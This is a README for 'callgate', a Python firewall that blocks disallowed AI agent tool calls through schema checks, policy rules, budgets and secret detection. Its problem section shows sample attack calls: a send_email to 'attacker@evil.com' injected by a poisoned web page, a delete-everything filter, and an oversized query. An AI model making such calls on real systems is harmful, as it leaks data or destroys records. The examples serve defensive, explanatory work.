# callgate

> **Fail-closed firewall for AI agent tool calls.**
> Structured outputs guarantee your agent's tool calls are *well-formed*. callgate guarantees they're *allowed*.

**Status: v0.2.0-dev. Phase 0 (core) in progress. Not released, not on PyPI yet.**

---

## The problem

Constrained decoding solved malformed JSON. It did nothing for this:

```python
delete_records(filter={})            # perfectly valid JSON. whole table gone.
send_email(to="attacker@evil.com")   # address injected via a poisoned web page
db_query(limit=10_000_000)           # schema-valid. production melts.
```

Every one of these is a **valid-but-wrong** call. Nothing in the platform stack blocks it.

## What callgate does

```
LLM tool call (OpenAI / Anthropic / Gemini native JSON, no custom format)
        │
        ▼
   ┌─ callgate ────────────────────────────────┐
   │  registered tool?  schema ok?  policy ok? │──BLOCK──► logged, never executed
   └───────────────┬───────────────────────────┘
                   ▼ ALLOW
              tool(**args)
```

```python
from callgate import Gate, Meter, Policy, Shield, ToolSchema, in_range, not_empty

gate = Gate(default="deny", meter=Meter(), shield=Shield(mode="block"))
gate.register("db_query", db_query,
              schema=ToolSchema(required=["q"], types={"q": str, "limit": int}),
              policy=Policy(constraints={"limit": in_range(1, 100)}))
gate.register("delete_records", delete_records,
              schema=ToolSchema(required=["filter"], types={"filter": dict}),
              policy=Policy(constraints={"filter": not_empty}, require_approval=True))
gate.budget(max_calls=20)

result = gate.run(openai_response)   # any provider shape, or a plain dict
# result.verdict: ALLOW | BLOCK | NEEDS_APPROVAL. Only ALLOW executes.
```

- **Zero required dependencies**: stdlib only, drops into any Python agent
- **Fail-closed**: unknown tool, schema violation, policy violation, budget hit, unparseable payload: blocked
- **Policy engine**: value constraints, cross-arg rules, human-approval flags, budget caps
- **Shield**: secret detection (AWS/OpenAI/GitHub/Stripe/JWT/PEM patterns + entropy) blocks exfil through tool args; audit log never contains the value
- **Audit trail**: every verdict exported to JSON/CSV (`callgate report audit.json`)

**Current proof:** the published suite blocks **24/24 attack cases across 9 classes
with 0 false blocks** on clean traffic, at p95 0.07 ms overhead
([full report](gate-suite/results/REPORT.md), run it yourself: `python gate-suite/run_suite.py`).
Detection is pattern + entropy based and is never 100%; the report states exactly
what is and is not proven.

Try it without an API key:

```bash
cd callgate && pip install -e .
python examples/quickstart.py             # 6 gated scenarios
python examples/dangerous_agent_demo.py   # off-the-rails agent, with vs without the gate
```

### Dry-run: see what your agent would do, before it does anything

```python
gate = Gate(default="deny", dry_run=True, meter=Meter())
# ... run your agent; ALLOW calls are simulated, never executed ...
print(gate.report())                 # verdict counts, blocked reasons, secrets caught
print(suggest_policies(gate))        # draft schema+policy from what was observed, for you to review
```

### Guard an MCP server

```python
from callgate import Gate, MCPGuard
guard = MCPGuard(gate, forward=call_downstream_mcp_server)
decision = guard.handle(tool_name, args)   # only ALLOW is forwarded; blocks return an MCP error
```

See `examples/mcp_guard_demo.py`. Install the transport extra with `pip install 'callgate[mcp]'`.

## Roadmap (Phase 0 → 1)

- [x] Provider intake (OpenAI chat + responses, Anthropic, Gemini, plain dict)
- [x] Fail-closed gate + schema layer + audit meter
- [x] Policy engine: value constraints, cross-arg rules, approval flags, budget caps
- [x] Shield: secret detection/redaction on tool args and text (registration is the allowlist)
- [x] Failure-scenario suite: 24 attacks across 9 classes, report published per release
- [x] Dry-run mode: full agent run, zero execution, `gate.report()` "would-have-done" summary
- [x] Suggested-policy generator: observed calls -> reviewable draft schema + policy
- [x] `callgate-mcp`: `MCPGuard` puts the gate in front of any MCP server (tested core; stdio wiring lands with first pilot)
- [ ] PyPI release

## What happened to TOAP?

This repo used to be **TOAP**, a token-compression DSL for tool calls. We measured it honestly and killed it. The full postmortem (real numbers, tokenizer analysis, lessons) is on the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/Project_TOAP/tree/toap-v0.1-archive) branch. callgate keeps the part of TOAP that was never about compression: the fail-closed checkpoint between the model and your tools.

## License

MIT, see [LICENSE](LICENSE)

Built by [Mohammad Safwan Athar](https://github.com/Dev-Saif-Ops)
